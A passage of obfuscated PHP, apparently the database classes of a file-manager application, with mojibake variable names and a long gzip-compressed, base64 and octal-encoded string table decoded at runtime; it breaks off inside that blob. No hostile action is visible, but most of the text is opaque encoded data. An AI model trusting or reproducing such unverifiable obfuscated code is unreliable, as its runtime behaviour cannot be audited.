return $ãûÇõ»; } public function parseKey(&$ Æôşœ‹, $ØÅ¡÷áÒ = true) { $‹¶Î§—¿ =& $_SERVER[¯µç›È¢]; if ($ØÅ¡÷áÒ) { $ Æôşœ‹ = $this->parseKeyCheck($ Æôşœ‹); } if ($this->dbType == $‹¶Î§—¿[959]) { if ($ Æôşœ‹ != $‹¶Î§—¿[195] && !preg_match($‹¶Î§—¿[923], $ Æôşœ‹)) { $ Æôşœ‹ = $‹¶Î§—¿[393] . trim($ Æôşœ‹, $‹¶Î§—¿[393]) . $‹¶Î§—¿[393]; } return $ Æôşœ‹; } else { return parent::parseKey($ Æôşœ‹, $ØÅ¡÷áÒ); } } public function close() { $this->_linkID = null; } public function error() { $¿£±Ì¤Ó =& $_SERVER[¯µç›È¢]; if ($this->PDOStatement) { $•³–ŞĞ½ = $this->PDOStatement->errorInfo(); $this->error = $•³–ŞĞ½[1] . $¿£±Ì¤Ó[4] . $•³–ŞĞ½[2]; } else { $this->error = $¿£±Ì¤Ó[12]; } if ($¿£±Ì¤Ó[12] != $this->queryStr) { $this->error .= LNG($¿£±Ì¤Ó[48]) . $this->queryStr; } think_trace($this->error, $¿£±Ì¤Ó[12], $¿£±Ì¤Ó[49]); return $this->error; } public function escapeString($»øŒ¢Çß) { $·Ù§‰® =& $_SERVER[¯µç›È¢]; switch ($this->dbType) { case $·Ù§‰®[956]: case $·Ù§‰®[929]: case $·Ù§‰®[947]: case $·Ù§‰®[959]: return addslashes($»øŒ¢Çß); case $·Ù§‰®[931]: case $·Ù§‰®[948]: case $·Ù§‰®[930]: case $·Ù§‰®[932]: return str_ireplace($·Ù§‰®[58], $·Ù§‰®[59], $»øŒ¢Çß); } } protected function parseValue($ë‘Ù€Æ») { $¬‹¼ñÈ… =& $_SERVER[¯µç›È¢]; if (is_string($ë‘Ù€Æ»)) { $ÆÌ§öü÷ = strpos($ë‘Ù€Æ», $¬‹¼ñÈ…[4]) === 0 && in_array($ë‘Ù€Æ», array_keys($this->bind)); $ë‘Ù€Æ» = $ÆÌ§öü÷ ? $this->escapeString($ë‘Ù€Æ») : $¬‹¼ñÈ…[969] . $this->escapeString($ë‘Ù€Æ») . $¬‹¼ñÈ…[969]; } elseif (isset($ë‘Ù€Æ»[0]) && is_string($ë‘Ù€Æ»[0]) && strtolower($ë‘Ù€Æ»[0]) == $¬‹¼ñÈ…[305]) { $ë‘Ù€Æ» = $this->escapeString($ë‘Ù€Æ»[1]); } elseif (is_array($ë‘Ù€Æ»)) { $ë‘Ù€Æ» = array_map(array($this, $¬‹¼ñÈ…[970]), $ë‘Ù€Æ»); } elseif (is_bool($ë‘Ù€Æ»)) { $ë‘Ù€Æ» = $ë‘Ù€Æ» ? $¬‹¼ñÈ…[99] : $¬‹¼ñÈ…[204]; } elseif (is_null($ë‘Ù€Æ»)) { $ë‘Ù€Æ» = $¬‹¼ñÈ…[114]; } return $ë‘Ù€Æ»; } public function getLastInsertId() { $Îçñ…­‘ =& $_SERVER[¯µç›È¢]; switch ($this->dbType) { case $Îçñ…­‘[956]: case $Îçñ…­‘[948]: case $Îçñ…­‘[929]: case $Îçñ…­‘[947]: case $Îçñ…­‘[931]: case $Îçñ…­‘[959]: return $this->_linkID->lastInsertId(); case $Îçñ…­‘[930]: case $Îçñ…­‘[932]: $ÊÒ­Í¿Ç = $this->table; $ıÓšÌñô = $this->query("\123\105\x4c\x45\x43\x54\40{$ÊÒ­Í¿Ç}\x2e\x63\x75\162\162\166\x61\x6c\x20\x63\165\162\x72\x76\141\154\x20\106\x52\x4f\x4d\x20\x64\x75\x61\x6c"); return $ıÓšÌñô ? $ıÓšÌñô[0][$Îçñ…­‘[971]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($™İ¥Ò‡·) { $ªšÔµ± =& $_SERVER[¯µç›È¢]; if (!CacheLock::fileLock($ªšÔµ±[13])) { return !1; } $üÁ· ÖØ = parent::query($™İ¥Ò‡·); CacheLock::fileUnLock($ªšÔµ±[13]); return $üÁ· ÖØ; } public function execute($ı™õº•Î) { $ÎÛ„™±ª =& $_SERVER[¯µç›È¢]; if (!CacheLock::fileLock($ÎÛ„™±ª[13])) { return !1; } $¯¸®„ĞÀ = parent::execute($ı™õº•Î); CacheLock::fileUnLock($ÎÛ„™±ª[13]); return $¯¸®„ĞÀ; } } goto A¿öè§½à„; bï¢ÂÉ÷’Ï: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\257\265\347\233\310\242", base64_decode('z/PSisCU')); $_SERVER[¯µç›È¢] = explode("\174\1\174\3\174\1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\11\174\33\305\365\70\116\200\266\204\273\134\55\224\266\213\41\330\116\164\70\166\116\47\116\42\333\262\55\42\133\106\222\163\20\233"."\315\112\132\131\153\113\132\131\273\362\225\244\224\43\334\367\221\162\204\253\205\2\205\160\337\107\200\102\71\13\345\206\222\2\205\134\224\273\245\205\6\372\245\277\71\336\34\273"."\x92\xe1\xfb\xff\xfc\x7f\x9f\xcf\x2f\x90\x68\xee\x9d\x79\xf3\xe6\xcd\x7b\x6f\xde\xbc\xb9\xf0\xfe\xdf\x9c\x75\xf2\x2b\xab\x27\xad\xde\x65\xf5\xa4\x8f\x5e\xb8\xeb\xac\x67\x6f\xa4\x61\xf2\xdf\xf7"._kodDe('MuRUU9Oi2OX/65+TBcDDuGBpxsNG04qlyMct5aFroWorC9Orw8Pe6iuKGlxG5uuL6g==').strrev('QıQ§[Lç¨¸hŸÓõı<†Ÿ£ió4š-²ÃQôVÓy(ş‘³ZQQèqœ”í')."\x79\xaf\xd0\xbf\xd6\x50\xd6\x60\xf9\x6a\x57\x24\xae\xc6\x7a\xba\xbb\x83\xd1\x38\x14\x6a\x94\xf3\x73\x66\xa\x42\x5\xad\xa8\xe5\xe0\xfb\x5\xbd\x68\xa1\xde\xc8\xcd\xa9\x5\xb3\xa0\xe7\x1d\x29"."\42\41\245\331\132\102\263\240\245\326\146\265\65\330\35\216\54\127\343\313\273\203\120\42\241\16\225\364\342\30\215\221\140\314\326\212\166\334\310\351\274\304\110\221\367\253\71\330".base64_decode('HupS4tFAVyzQEg9FumhyS6SzMxQvT49GwuHmQMvi8pzuaKC9M6Cg/mV11cinzRpl')."\x25\xcd\x59\xa9\xd4\xd2\x40\x9b\xa1\x67\x53\x34\x98\xd7\x58\x77\xec\xb1\x2\x84\xe2\x3c\x84\xa6\x29\x5f\xca\x66\x69\xa4\x8b\x87\x52\x7a\x5a\x2b\x65\x1\x5a\xad\x72\xa4\x50\x34\x72\x1a\x1b\xf4"."\142\175\214\247\322\200\126\262\115\43\237\244\221\340\250\135\324\104\72\352\153\22\115\264\236\207\246\142\301\160\260\45\256\340\16\52\155\321\110\247\2\223\220\323\54\133\57\52".base64_decode('SzuC0aCCO91UTcZarQC+dCFQKIFwWJmoBVvPFVgztE6FxiLR1mBUaV6uCAglzVzO')."\314\373\120\53\150\46\155\251\253\301\150\224\6\74\200\336\341\20\236\64\210\104\332\332\142\101\36\203\301\35\35\106\75\151\0\374\164\304\122\351\254\255\16\153\331\22\103\323".base64_decode('QfpbDT/wq2ppIwtFcMgyxnU5J4biobzIV/t1W0XLzEa9BqRvDsRCLWp3IN4Bs1Ao')."\xf8\xad\xd4\xa0\xe5\xd7\x8a\xc9\x8c\x31\xac\x87\x8d\x84\x3f\x61\xe4\xfd\x18\xd9\x7d\x9\xb6\x2c\x77\xa7\x3f\x33\x0\x26\x19\x3d\x39\xa8\x6a\x9\xb3\x68\xeb\x80\x52\xa5\x7c\xd6\xc8\x43\xa7\x4d"."\13\276\65\144\344\215\22\54\46\30\250\151\362\305\17\201\22\53\255\263\24\75\5\201\34\252\157\2\175\100\243\30\246\301\246\5\364\167\36\24\112\340\21\16\353\105\133\325".strrev('ãÀpáÎ]Tâ(½)³6:s€KiÖ0³I}2ZY"Ö™Ù¡¥„,¤äe3Ió').strrev('ÈSÕÆÅ­6Û¤(tÉï7n¢›L©¢LT³,&A1é@ˆ’îÿ¢©³@G„\\œ¥]Ú')."\232\132\52\246\27\245\261\266\241\212\221\222\55\47\226\110\261\66\263\230\153\105\163\14\337\107\213\331\350\251\220\61\310\226\163\112\2\241\277\146\305\361\336\157\372\126\54\102".base64_decode('/9QCxe6FPmX0bFbVR3VY77nUTIsN0m9hxEIpNBqKqBnNynSmZqqkFtsIUvqor5Ap')."\x0\x31\xe2\xf4\xa7\xd7\xb1\x1e\xf1\xb4\x74\x99\x76\x50\xda\x4e\xb2\x66\x52\xcb\xca\x43\xa4\xe1\x8c\x6d\x17\x62\x7a\x3e\xd5\xc6\x57\x4e\xca\x1c\xc9\x13\x48\x15\x74\x86\xbe\xad\x1e\x25\xa5\x74"."\52\313\225\216\106\243\321\142\25\163\131\36\142\243\343\151\26\117\264\107\31\252\244\322\64\300\227\115\25\304\213\346\210\305\200\207\26\134\326\110\152\266\141\346\375\146\322\326"."\155\257\145\27\165\15\32\13\44\223\272\145\171\133\320\232\55\232\131\157\40\233\65\107\274\221\242\321\157\344\33\225\251\260\75\320\5\355\305\44\273\21\150\113\325\74\5\343"."\10\246\133\123\233\112\166\332\73\207\321\14\136\272\250\345\255\264\136\364\6\141\225\64\52\250\237\234\156\263\142\255\206\125\60\55\3\167\257\121\321\154\133\113\146\60\315\23".strrev('4¥£HVÕ`d%(R£ZsúÔ]Ûİu¨#CŒïiUõ‹u`´pl¬½SyK}7Í')."\112\22\107\75\112\256\144\331\336\242\216\210\247\201\150\26\114\161\50\355\355\304\113\312\320\123\336\30\332\143\40\271\241\156\206\202\260\106\141\171\64\265\43\36\357\126\103\155"."\210\211\350\12\252\235\201\170\13\220\306\240\255\365\263\76\207\321\316\301\233\144\211\313\274\150\151\141\274\352\102\143\25\211\335\346\210\136\104\37\156\36\153\124\6\315\124\302"."\x1c\xf5\xb1\xac\x36\x20\xd2\xac\x30\x9e\xee\x82\xed\x8d\x6a\xf9\x7e\xc\x9f\xc4\x98\xad\x3\xf6\x59\xc3\xfd\x4e\x40\x87\xf5\x7c\xbf\x9d\x61\x15\x63\xc1\xe8\x92\x60\x54\x8d\x45\xda\xe2\x4b\x3".strrev('¹^B¡kÕ¦¨p¼°­x¹b¹à]x2±¨`+OVm\'Ğ!OToYÓp§ÙFKò?`Q')."\153\73\154\344\14\334\167\233\347\20\110\42\336\244\35\72\344\47\3\152\352\315\114\255\351\115\115\253\365\242\177\247\326\256\350\155\365\115\355\133\350\67\104\35\377\164\337\164"."\xa5\xbe\x6e\x96\xd2\x8d\x98\x25\x43\xcb\x2a\x30\xe8\xb2\x12\x75\x4a\x64\xb1\x13\x2c\x2\x9b\xf3\x66\x5e\xff\x16\xe0\xe0\xdd\x56\x5a\xf1\x2e\xb0\xd2\xc4\x68\xf0\xe8\x9e\x60\x2c\xae\x76\x6\xe3"."\35\221\126\370\172\60\0\241\260\111\227\55\33\355\12\372\323\347\23\64\32\341\103\50\247\365\273\50\67\216\165\232\105\335\231\42\166\222\245\106\212\221\166\34\355\320\215\376"."\xc\x8c\xdd\xc0\xad\x25\xcd\xac\x59\xd4\xb2\x98\xc0\x31\x4\xd7\x19\xd1\xe9\x37\x80\xe8\x0\x2d\x15\x91\x98\x91\x2b\x30\x92\x67\x67\x4a\xb9\x84\x14\x4\xa2\x6d\x21\x5c\x60\x5b\x4e\xc6\xe4\x5b"."\36\332\327\151\250\321\17\5\247\324\267\61\242\355\217\65\240\377\5\205\116\231\71\215\321\73\102\256\364\24\245\127\64\151\252\43\247\103\327\304\36\152\27\155\23\247\26\35"."\105\72\165\73\143\302\44\41\366\5\272\124\342\175\143\275\114\351\131\235\101\43\243\63\152\137\7\305\320\156\305\141\45\170\46\304\153\242\124\261\315\32\126\24\325\304\274\37"."\213\57\305\314\271\110\260\171\321\54\332\150\42\211\1\264\224\150\134\65\254\66\211\41\120\115\222\207\72\257\211\362\335\105\75\155\300\202\314\243\31\353\324\212\203\254\2\232"."\x21\xb1\x23\xe1\x88\xd4\x58\x5b\x4f\x38\xac\xb6\x44\xba\xe2\x88\xe1\xa7\x29\x4b\xa3\xa1\x78\x90\xe1\x68\xa0\x55\xd\xb4\x74\xf3\xfd\x55\xcc\x38\x14\xc0\xc4\xa4\x7c\xa7\xa0\x29\xc3\xf5\x30\x30"."\324\35\277\330\315\20\165\56\230\171\113\367\2\263\350\25\202\101\131\126\112\120\174\240\51\142\227\160\21\376\121\257\226\33\367\346\20\120\274\274\243\316\255\126\211\313\73\166"."\10\146\121\20\162\14\106\44\263\261\75\276\73\22\203\12\13\161\52\342\237\22\172\21\76\326\335\3\131\71\11\203\332\203\161\266\137\153\300\66\5\226\306\30\365\55\241\202".base64_decode('RWNcE2NZyDrCRpDLCl7QORyvAHm8I9S1WO2MtAbDaqgLkZ94eXpPd2uAzaGc3hxh')."\254\70\244\366\40\2\264\44\20\16\271\213\7\227\205\142\361\130\305\54\224\326\23\164\345\40\371\264\73\32\154\13\55\343\321\266\120\60\334\32\123\133\2\55\35\242\114\127"."\240\23\42\152\32\113\210\226\337\131\136\105\224\64\306\345\114\165\30\313\314\14\130\252\103\264\123\231\320\242\12\344\101\73\246\16\50\6\303\305\222\72\31\11\310\351\111\263"."\xc4\xe8\x3c\x67\x14\x73\x8c\x78\xe4\x34\x58\x3d\x1a\xdb\xd\x6b\xe8\x4f\xad\x12\x88\x29\x76\x41\xe5\x64\x22\x31\xc6\x83\x64\x18\x2c\x8e\x58\x42\xf8\xbe\x2\x54\xbd\xac\x7\x2a\x2e\xd3\xac\xa7"."\71\201\256\234\20\110\333\174\261\273\342\10\353\105\36\232\201\0\121\11\40\114\40\63\2\237\61\320\32\52\332\1\326\235\264\20\307\325\110\167\60\32\300\302\274\272\64\32"."\351\152\207\12\43\31\235\165\40\4\340\257\141\34\24\310\364\266\240\124\210\375\321\140\221\344\4\320\7\114\6\312\325\364\347\110\372\203\70\77\370\270\236\147\120\117\140\242"."\315\266\35\26\110\243\325\300\10\256\131\342\137\113\230\146\226\55\120\304\4\160\112\301\165\2\3\26\103\222\121\106\143\246\261\235\13\66\216\170\144\161\260\113\145\230\105\143"."\22\66\322\4\44\145\107\242\0\20\333\34\144\262\24\315\214\6\143\154\171\27\365\241\222\301\300\345\367\115\3\54\326\321\336\4\237\367\37\333\73\62\255\146\205\167\232\257"."\17\5\152\247\56\242\121\210\365\372\34\321\43\240\176\251\310\153\143\336\250\306\132\130\333\330\353\357\365\327\54\154\134\21\360\216\153\336\361\72\357\134\157\337\264\136\137\355"."\64\110\350\133\125\357\231\261\6\27\100\5\27\36\336\207\176\232\172\27\116\351\365\36\371\213\225\213\126\364\366\125\67\116\73\254\327\167\170\357\110\337\324\332\205\354\73\311".base64_decode('UhHJickx3tXUtBrUJcQz8SJ5QuukAixj3CiI1FWz1rB0NId6v6ixwts7rW+hVE9K')."\x72\x7f\xb\xf1\x44\x88\xf0\x66\x78\xb9\x80\xf7\x18\x3c\x32\x5e\x15\xaf\x7b\xc0\x8f\x52\x3e\x29\xa8\x27\x5e\x17\x9\x2d\x9\x74\xc0\xe8\xcf\xf3\x25\x84\x36\x7b\x2e\x98\x3b\x59\xf5\x55\x53\xe8"."\357\32\66\221\375\372\50\43\15\371\264\121\4\354\54\345\215\41\246\35\311\353\103\20\60\155\206\337\11\335\36\321\31\172\240\164\107\34\41\7\23\15\121\226\24\313\22\356"."\17\276\200\245\46\216\243\34\231\214\202\212\131\257\21\36\113\351\171\230\247\311\120\332\112\152\5\75\46\215\120\125\343\201\346\160\120\145\24\6\50\61\213\23\252\330\314\65"."\x89\x68\x68\x82\xa2\x32\xfa\x90\x14\x7c\x3a\x11\x49\x60\xe5\x5b\x43\x59\x85\x10\x6\x45\x2f\x16\xcd\x62\x23\x51\xaa\x5a\xa5\x2\xe6\xd9\x90\xf8\x65\x23\xd8\x2a\x48\x66\x57\x9a\x16\x28\x14\xe4".base64_decode('UE+VJ6CgMQYBS9O6WPSYQkGfCmKGLMRpMbbHX9PbW1qhp/pWIMTXvOm+VQ1rahkr')."\357\357\105\177\130\44\120\101\275\247\162\152\250\242\215\331\207\373\301\125\40\216\10\317\246\121\263\310\171\243\202\203\273\266\115\133\313\72\232\210\343\24\106\232\330\306\15\112"."\3\72\333\141\101\261\360\126\56\351\105\11\71\355\342\252\77\256\373\220\24\163\270\106\114\267\175\274\204\107\312\124\121\334\241\243\156\252\142\304\76\217\226\123\213\264\325\121"."\325\115\154\314\262\365\234\103\231\152\351\130\21\327\126\312\146\155\316\343\147\215\101\370\2\254\225\225\225\312\266\231\105\46\347\116\205\357\126\115\255\124\60\224\317\43\251\124".base64_decode('xi2xq7YHEP8SV2qY4lEJdSnNkUg4GOhS8AYOGw/iDmLB7gDatbDEHIsHQRcaavWy')."\x76\x97\x79\x43\x20\x37\xf1\x80\x1\x70\x36\xb\x98\x64\xa8\x8\x8\x2a\x92\x69\x6\xd9\xe4\x21\xa\x68\xb3\xa2\xa0\x0\x83\x18\x66\x29\x3d\x58\xe5\xe3\xc1\xac\x85\x7\x8d\xc1\x83\x5\x25\x8f"."\340\347\75\102\203\346\31\66\364\21\22\340\154\265\7\270\155\217\255\25\21\207\200\331\141\10\206\132\75\206\325\112\104\11\362\1\222\305\72\144\147\260\166\43\253\215\171\150".base64_decode('58L6sJ71sK55WI89TBTwENGuFbrVg1YTdIsEEdHMeDD+YPT1CA2fxxzJ60VSBMAk').strrev('ùÀåYÃ)†ßİØ ò±C+H)éÔ˜{i¦¢Ìú [´b”ßfèT³Eı<P¤')."\216\71\52\237\6\247\140\265\212\266\10\2\372\32\266\267\71\312\210\131\145\313\55\253\213\30\206\273\10\55\21\313\25\17\250\115\33\226\21\256\22\362\261\35\206\141\257\70"."\x1b\x10\xba\x61\xc1\xf1\xba\x45\x4c\xb7\x66\x17\x7f\x34\xae\xf5\xc7\xa4\xcf\xd9\x5a\x3f\xfb\x56\x85\x5c\x1a\x8e\xea\xc9\xb1\xa4\x10\x53\x5b\x25\xe1\xd7\x19\xe3\x13\x40\xd6\x4c\x25\x7c\xaf\x3c"."\261\34\207\371\74\354\76\171\62\3\44\103\154\76\251\216\365\360\335\53\21\106\102\250\135\244\40\370\5\332\131\114\161\143\150\377\152\313\152\260\101\325\313\331\100\153\75\316"."\30\136\110\76\102\173\311\141\115\214\353\54\302\301\266\270\162\124\4\321\55\303\124\151\35\25\27\126\310\77\146\136\161\264\315\300\245\64\221\174\21\327\362\51\232\262\22\21"."\xf5\x95\x4d\x55\xec\x23\x55\x8e\xea\x2\x17\x9c\x9d\xf0\xb0\xa8\x52\x8e\x5d\x18\xdc\x32\x10\xf0\x36\x45\x86\x2f\x36\x22\x96\x14\x11\xfb\x5e\x9\x98\x3c\xcd\x4a\xd2\x0\xd6\x62\x43\x48\x67\x69"."\142\152\145\344\223\110\213\110\140\375\162\174\27\107\305\302\141\50\241\340\17\170\44\266\4\223\17\257\130\2\122\24\176\234\220\167\41\246\153\323\304\220\352\66\362\143\106\136"."\x56\x58\x89\x54\xb1\xef\x8a\x6d\x1f\x2f\x64\x97\x8a\xad\x75\xa2\x30\xdd\x37\x84\x42\xcc\x3\x8a\x32\xf\x3e\xb0\x92\xb6\x64\xa1\x8d\x41\xbd\x27\x87\x67\xa2\xef\xd0\x92\xab\xe7\x8c\x92\xc2\xa0"."\173\220\334\257\272\26\62\40\176\106\53\12\230\62\212\203\227\275\120\3\342\42\42\52\25\113\153\303\202\45\161\324\221\350\206\145\217\261\336\313\101\147\243\64\332\72\121\244"."\x83\xab\x33\x2a\x45\x65\x92\x64\x58\x61\x7e\xd8\xe7\xc\x93\x91\xc6\xcd\x8a\x51\xac\x4b\x63\x61\xca\x1\x58\x95\x76\x7e\xa2\x10\xa8\x61\x69\xc0\x6f\xa8\x92\x9a\x80\x53\x2a\x67\x3d\xda\xc1\x0".base64_decode('J/Zo50T7Hg0jfj6LtruiDy+sdrx7yRuHk+eI6WgVQT3RWqwsTy4tVER4IxAbB4O8')."\x58\x97\x62\x36\xc4\x22\x74\x20\x4e\xbf\xe8\x5d\x9\x95\x50\xcb\x3b\x85\x91\xbf\x72\xbc\xad\x68\x72\x4e\x98\xf3\x1\xee\x42\x2d\x44\xd4\xb4\x65\xd0\x4b\x9b\xb8\x4\x1c\x7\xbf\x51\x96\x24\xd5"."\161\163\36\256\124\127\124\314\212\143\253\242\111\114\337\254\245\162\106\336\127\244\233\236\17\11\20\160\214\354\251\223\230\63\101\251\126\131\144\153\201\115\162\215\153\322\155\323".strrev('`ŠÖs	É*¨”)¾Oºp†°ÚX äŒˆ@cq“P¡§Ä ™_DWÑiRD')."\312\260\161\12\336\16\115\246\315\26\5\245\243\137\236\46\223\151\262\333\224\315\226\20\14\74\123\34\45\53\361\4\276\251\144\33\367\125\76\321\306\147\342\64\44\331\247\344".base64_decode('+CE5SfRZtlkQOVKUZktZolGpFJ8R0g+0JlKE0RWAImWhLhGS6bLzYSlBOmUJtQaK')."\105\206\147\164\160\130\361\216\22\345\44\114\300\142\154\221\124\332\221\150\343\301\141\141\175\102\233\302\37\366\321\45\353\323\122\251\10\73\126\222\303\345\105\145\205\141\345\206"."\210\51\20\157\112\212\125\56\36\310\146\305\71\274\73\76\141\25\272\72\345\112\162\312\204\325\332\210\204\312\16\307\52\245\161\341\104\346\274\235\234\266\260\212\160\163\344\116"."\102\73\61\233\62\1\125\22\23\132\71\216\266\364\226\214\221\327\55\276\63\27\255\112\104\346\377\61\77\134\76\7\170\255\114\204\70\70\117\122\62\143\173\270\141\307\66\314"."\x35\xa9\x82\x86\x49\x9c\x6\xd9\xb5\x55\xdb\xc1\x23\x45\x49\x1b\xd2\xe2\x71\xe0\x3\x5a\xac\x74\xcc\x78\x1f\x9\x45\xd0\x62\xac\x8c\xa1\xee\x72\x3a\xd3\x25\x13\x3a\x37\xca\xf7\x42\xb9\x12\xc2"."\x28\xcc\x60\x4d\xd4\x26\xcb\xe6\x4d\x9\x6e\xec\xda\x57\x6e\xfd\xdb\x45\x1b\x68\x78\xf3\x7b\x4f\xaf\x3b\xf7\x54\x1a\x9e\xde\x30\x9b\x6\xd0\x7f\x3b\xa3\xff\x48\x58\x18\x29\xae\x5d\x36\x66\x6e"."\x7e\xe2\xc0\xf6\xcf\x43\xb3\xfe\xdc\xf7\xd8\xd0\xe1\xcb\xd7\x6d\x69\xe9\xec\xbb\xe9\xa6\xc7\xd6\x79\x57\x5c\xf7\x71\xd3\xa5\x53\xda\xb6\x74\x5f\x33\x73\x4b\xf7\x63\x57\x4f\x99\xfb\xf5\x9f\x7e"."\235\273\175\307\341\301\323\363\307\347\137\374\165\337\235\213\366\270\363\317\173\275\120\25\330\357\237\233\136\151\337\30\74\145\375\211\327\74\330\265\347\143\353\277\334\366\334\37"."\127\231\277\370\364\307\375\127\376\347\375\247\127\104\336\76\244\152\376\116\327\357\361\344\244\177\32\303\73\165\206\225\53\57\351\172\43\74\264\146\247\305\351\363\254\137\156\57"."\xed\xf2\xab\x73\x9a\xe\xd8\xf3\xe3\x57\x96\x75\xfe\xfd\xe1\x8f\x4f\x7a\x64\xef\x27\xe\x5f\xf0\xeb\xc7\x7f\xb6\xf7\x61\xef\xb6\x7e\x70\xaf\xa7\xee\x86\xf5\x3b\x4d\xfa\x43\x6b\xbe\x7a\xf6\xdc"."\x8f\x66\x4d\xb6\xeb\xd6\x4e\x3f\x6d\x97\xbb\xae\x59\xf1\xe1\xa1\xaf\x8d\xaf\xf9\xf8\xd6\x4d\x7f\x3d\x53\xdf\x34\xf3\xaf\x33\x3e\x5c\xfe\xf6\xed\x2b\xe7\x3f\xa3\x1f\xa5\x58\x4b\x9e\x9f\xff\x9f"."\x1d\xb7\x7f\xf1\xe8\xf9\xa9\xcf\xff\xf4\x8b\x1b\x9f\xf9\xc1\x43\xb\xfe\xbb\x6e\xda\xdf\xaf\x7a\xb1\xf1\xaf\x9b\x3f\x4e\xf\xde\xf8\x97\x57\xce\xbf\xe9\x91\x53\x8e\x58\x35\xf0\x58\xe8\xa0\x55"."\257\74\161\363\225\267\17\254\14\77\261\343\374\215\127\233\173\376\361\244\371\277\377\343\354\207\26\275\176\365\247\326\335\47\136\227\152\62\267\275\73\276\361\334\177\16\254\73"."\xee\xd2\xbb\x23\x1f\xce\x8a\x6e\x7b\xde\xd3\xf8\xe2\x19\x83\xf7\x25\xf2\xde\x27\xe7\xbe\x3a\x6b\xe7\x86\x8e\x7b\x37\xdd\xd1\x7d\xcf\x67\x37\xbf\x71\xc8\x99\x4f\x67\x9f\xeb\xf5\xde\x74\x50\x71"."\321\33\163\76\257\265\217\71\157\343\372\315\355\353\167\371\353\43\107\364\255\335\370\274\361\243\346\337\44\2\153\342\217\236\274\357\213\153\22\167\117\176\140\237\313\167\137\173".base64_decode('/KeRuun3T9qvam97lwX1ufdePnlOdud9//HIvrNuaz41ddv+7QesCmVn/fOA5ef9').base64_decode('bPOWvUv7Xjf50Prqv0+3f3nWVw2R9yft+eTw1wdd+NpeBxcf9D0xY9bF++224mcX')."\176\162\353\116\307\257\171\160\237\147\167\173\67\164\345\163\123\16\372\342\321\272\304\342\33\157\270\53\371\223\223\173\77\370\375\323\207\75\360\136\143\333\311\17\172\36\235\272"."\352\330\75\77\75\351\343\357\137\165\353\331\247\355\162\322\77\276\177\305\275\273\355\262\371\352\217\173\316\335\353\255\17\77\372\355\307\157\234\277\370\221\133\247\246\157\266\56".base64_decode('/qiUTsx8eJvvlf7Goy69MrV0311b7/9e5Me7ay8PtxvPb7zt0s9651xZOO+92tIB').strrev('wšìÿ×¥õØ>}µ¤äğ½\'WŞsôûª!üvß¯Ãsç}¿Ï9è~½öëy×').strrev('ö·zÎI.Ë´å:-Ÿãöğ~‡Ûløç~åşÎë'."\r".'¡ôõ¿µïäå¶|Nßæó2»ê÷')."\200\71\257\337\66\370\146\313\320\202\153\136\31\76\245\351\207\33\216\334\255\373\250\206\5\7\235\126\173\127\353\266\357\377\351\354\163\337\170\362\360\261\35\323\237\355\171\260"."\346\212\177\327\35\325\167\321\111\173\137\374\350\157\57\73\365\241\261\103\116\232\375\306\335\267\356\361\116\370\234\133\77\333\345\324\227\264\346\13\152\172\332\214\336\320\254\326"."\165\157\117\375\362\220\3\67\364\175\362\351\21\317\135\224\171\357\301\130\307\352\364\310\163\115\235\57\116\317\77\123\373\315\336\237\155\30\74\363\307\7\206\163\13\156\275\360"."\320\272\75\17\174\71\161\326\272\233\316\310\176\174\303\206\307\66\156\270\175\152\177\346\302\241\31\123\137\30\370\372\260\43\117\152\173\365\177\236\70\176\111\176\326\212\47\217".base64_decode('+c0fxp68y7th08C/tj+7186ffHbyfkcU80rPsadt3W/fPULpK2uue+aFczfcN3X6')."\367\7\252\136\271\377\234\227\267\375\326\363\356\316\115\371\153\236\232\127\167\350\354\336\330\251\253\153\16\75\154\376\205\241\243\376\265\367\53\63\367\371\54\176\302\133\103\267"."\136\366\352\155\263\223\227\237\30\274\343\324\311\367\377\342\316\144\357\345\207\114\373\311\63\133\377\171\362\332\223\317\337\70\353\17\125\247\357\374\77\277\135\373\263\53\26\335"."\76\363\1\355\265\337\357\275\347\36\257\357\365\362\336\327\254\334\347\371\346\356\257\336\71\174\277\327\257\36\174\371\223\57\43\75\346\254\151\17\316\75\371\335\324\246\107\57"."\377\325\231\265\73\357\357\213\135\173\371\131\371\100\163\335\330\212\233\366\316\36\174\315\25\77\232\366\354\251\107\276\23\275\52\61\345\262\245\15\355\207\126\255\177\173\260\347"."\256\337\34\163\317\165\157\36\271\163\147\307\21\267\17\177\365\77\167\277\266\341\325\301\267\216\131\232\131\71\351\365\213\16\276\145\350\205\17\357\270\370\205\251\363\266\236\170".base64_decode('4jENpx08af6BL+324U4fn3j0+hVvf3/bQ5vWPnh2QQkvG1898qedejY/fkjwgj9U')."\355\367\152\366\260\45\253\142\37\75\371\334\346\347\266\64\217\76\177\344\247\15\227\276\33\330\343\233\216\247\274\267\126\355\75\153\377\306\73\157\373\343\161\155\307\377\64\136"."\163\351\310\47\305\257\336\316\275\125\263\345\214\33\317\330\143\361\310\101\237\74\176\332\244\363\247\156\152\271\153\327\204\375\367\17\373\177\164\334\127\177\170\365\306\207\373\36"."\xfa\xc5\xf8\x8e\x5f\x5d\xf7\x4e\xd3\x71\x43\xff\xfa\xea\x5f\xab\x96\xde\xf2\x70\xe3\x71\x3b\xfe\xf4\xf9\x39\xc7\xf6\xae\xfe\xe6\xf5\x67\x7f\x75\x8b\xef\xbf\x9f\x3d\x3b\x77\xee\x90\x79\xce\xbf"."\237\370\371\177\354\105\353\216\133\367\317\313\16\172\47\363\314\343\7\134\330\172\156\177\137\307\301\277\154\277\153\337\175\377\366\331\353\217\255\353\376\42\160\373\364\75\346\125"."\x4d\xfa\xc9\x9\x79\x7b\xf3\x4e\x93\xd6\x1c\x90\xbe\x7c\x6d\xe6\x82\x81\x8f\x1e\xbe\xef\xe5\xe5\xf7\xa4\xb4\xc4\x95\x8f\xc6\x1f\xf6\xa4\x37\xdf\x79\x6d\x3c\x5a\x73\xd0\xfa\x19\xcd\x6b\xf\x38"."\xaa\xfe\xbe\xc5\x7b\xef\xa3\xf\x1d\xfd\x74\xe7\xa3\x1f\x5c\xa1\x9d\xfd\x73\xfd\xed\xbe\x65\xe3\xf\xda\x23\x47\x4f\x3b\x6d\xdd\x26\xcf\x1\x9f\x9f\xf3\xa3\x75\x7\x7d\x39\xfc\xe1\x43\x3\x4f"."\317\350\172\151\155\333\3